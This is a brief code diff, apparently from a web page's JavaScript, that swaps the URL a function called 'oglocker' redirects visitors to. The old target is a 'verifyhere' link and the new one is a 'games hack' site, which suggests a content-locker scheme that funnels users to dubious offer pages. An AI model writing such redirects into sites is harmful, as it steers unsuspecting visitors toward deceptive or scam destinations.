@@ -75,5 +75,5 @@ $(function() {
 
 function oglocker(){
 
-        window.location.href = "https://verifyhere.xyz/cl/i/6dxw9m";  
+        window.location.href = "https://allgameshackintermediate.onrender.com";  
 }
